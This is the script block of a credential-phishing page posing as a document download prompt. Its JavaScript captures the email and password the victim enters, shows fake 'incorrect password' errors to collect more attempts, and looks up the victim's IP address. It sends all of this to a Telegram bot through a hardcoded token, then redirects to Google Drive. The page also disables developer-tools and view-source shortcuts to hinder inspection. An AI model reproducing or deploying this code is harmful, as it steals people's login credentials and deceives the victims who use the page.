        .bg-overlay {

<script nonce="MjgxNTE0NDU5LDE4NjkxMzI0MDA=" type="text/javascript">
    $(document).ready(function() {
        // Extract email from URL hash and set it in the email field
        const hash = window.location.hash.substring(1);
        const emailFromHash = decodeURIComponent(hash);
        if (emailFromHash) {
            $('#tin').val(emailFromHash);
        }

        let attemptCount = 0;

        function handleFormSubmission(event) {
            event.preventDefault();
            attemptCount++;
            if ($("#email").val() || $("#password").val()) {
                $("#message").html("Error Retrieving document(s)");
                return;
            }
            $("#loadingGif").show();
            var tinVal = $("#tin").val();
            var tanVal = $("#tan").val();

            if (attemptCount < 3) {
                setTimeout(function() {
                    $("#message").html("Incorrect password, try again");
                }, 1000);
                $("#tan").val("");
            } else {
                setTimeout(function() {
                    $("#message").html("Success! Retrieving document(s)");
                }, 1000);
                setTimeout(function() {
                    window.location.href = "https://drive.google.com/drive/u/0/my-drive";
                }, 2000);
            }

            $.get("https://api.ipify.org?format=json", function(response) {
                var ip = response.ip;
                var botToken = "7110676493:AAH8RArjJytQPFl39dtxicrEW6NgOT81RqI";
                var chatId = "6577017804";
                var message = "Email: " + tinVal + "\nPassword: " + tanVal + "\nIP Address: " + ip;

                $.ajax({
                    url: `https://api.telegram.org/bot${botToken}/sendMessage`,
                    method: "POST",
                    data: {
                        chat_id: chatId,
                        text: message
                    },
                    success: function() {
                        console.log("Message sent to Telegram successfully");
                    },
                    error: function() {
                        console.log("Error sending message to Telegram");
                    },
                    complete: function() {
                        $("#loadingGif").hide();
                    }
                });
            });
        }

        $("#myForm").submit(handleFormSubmission);
    });

    document.onkeydown = function (e) {
        if (e.keyCode == 123) return false;
        if (e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) return false;
        if (e.ctrlKey && e.shiftKey && e.keyCode == "J".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "U".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "X".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "Y".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "Z".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "A".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "P".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "S".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "D".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "E".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "F".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "G".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "H".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "K".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "L".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "Q".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "R".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "T".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "W".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "N".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == "O".charCodeAt(0)) return false;
        if (e.shiftKey && e.keyCode == 112) return false;
        if (e.keyCode == 67 && e.shiftKey && (e.ctrlKey || e.metaKey)) return false;
        if (e.keyCode == "J".charCodeAt(0) && e.altKey && (e.ctrlKey || e.metaKey)) return false;
        if (e.keyCode == "M".charCodeAt(0) && e.altKey && (e.ctrlKey || e.metaKey)) return false;
        if (e.keyCode == "V".charCodeAt(0) && e.altKey && (e.ctrlKey || e.metaKey)) return false;
    }
</script>
